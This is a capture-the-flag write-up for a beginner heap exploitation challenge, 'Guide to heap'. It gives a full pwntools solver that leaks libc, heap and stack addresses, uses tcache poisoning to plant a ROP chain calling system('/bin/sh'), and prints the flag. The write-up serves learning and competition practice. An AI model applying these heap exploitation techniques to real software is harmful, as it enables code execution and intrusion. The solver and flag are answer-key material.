# Guide to heap

This problem was generated using ChatGPT. No modifications have been made to the original source code.  
Originally, as the title suggests, I intended this to be a beginner-friendly heap problem where simply following the instructions would allow you to obtain the flag.  
I apologise for the misleading title.  
However, as it is a template problem, I believe it remains within the scope of beginner-friendly content.

## Result
Solved: 28  
Points: 383  
1st: syn9(sknb)  
2nd: 0xM4hm0ud(The Trio)  
3rd: 5unsetpowerln(TPC)

## Challenge
We will guide you to the door of the heap world!  
`nc chal1.fwectf.com 8010`

Attachment: [guide_to_heap.zip](guide_to_heap.zip)

## writeup

Knowing the following will enable you to solve it:
* tcache, unsortedbin, etc.
* double free, UAF
* tcache poisoning
* libc leak
* ROP

Below is the executable code:
```python solver.py
from pwn import *

elf = context.binary = ELF('./chall')
libc = ELF('./libc.so.6')

def allocate_(index, size, data=None, zero=False):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b': ', str(index).encode())
    p.sendlineafter(b': ', str(size).encode())
    if not zero:
        p.sendafter(b': ', data)
def delete_(index):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b': ', str(index).encode())
def edit_(index, data):
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b': ', str(index).encode())
    p.sendafter(b': ', data)
def show_(index):
    p.sendlineafter(b'> ', b'4')
    p.sendlineafter(b': ', str(index).encode())
def exit_():
    p.sendlineafter(b'> ', b'5')

p = process('./chall')

allocate_(0, 0x418, b'A'*0x418)
allocate_(1, 0x18, b'B'*0x18)
delete_(0)
delete_(1)

show_(0)
libc.address = u64(p.recvn(6).ljust(8, b'\0')) - 0x203b20
print('libc', hex(libc.address))

libc_argv = libc.address + 0x2046e0

show_(1)
heap = u64(p.recvn(3).ljust(8, b'\0')) << 12
print('heap', hex(heap))

allocate_(2, 0x18, b'A'*0x18)
allocate_(3, 0x18, b'B'*0x18)
delete_(2)
delete_(3)
edit_(3, p64((heap>>12)^libc_argv))
allocate_(4, 0x18, b'C'*0x18)
allocate_(5, 0x0, zero=True)
show_(5)
stack = u64(p.recvn(6).ljust(8, b'\0'))
print('stack', hex(stack))

target_stack = stack - 0x148

allocate_(6, 0x108, b'X'*0x108)
allocate_(7, 0x108, b'Y'*0x108)
delete_(6)
delete_(7)
edit_(7, p64(target_stack^(heap>>12)))
allocate_(0, 0x108, b'Z'*0x100)

system = libc.sym['system']
binsh  = next(libc.search(b'/bin/sh\0'))
pop_rdi = libc.address + 0x001ae710
ret = pop_rdi + 1

rop = flat(
    ret,
    pop_rdi,
    binsh,
    system,
)
payload  = p64(0xdeadbeef)
payload += rop
allocate_(1, 0x108, payload)

p.interactive()
```

## flag

`fwectf{kn0w1ng_7c4ch3}`
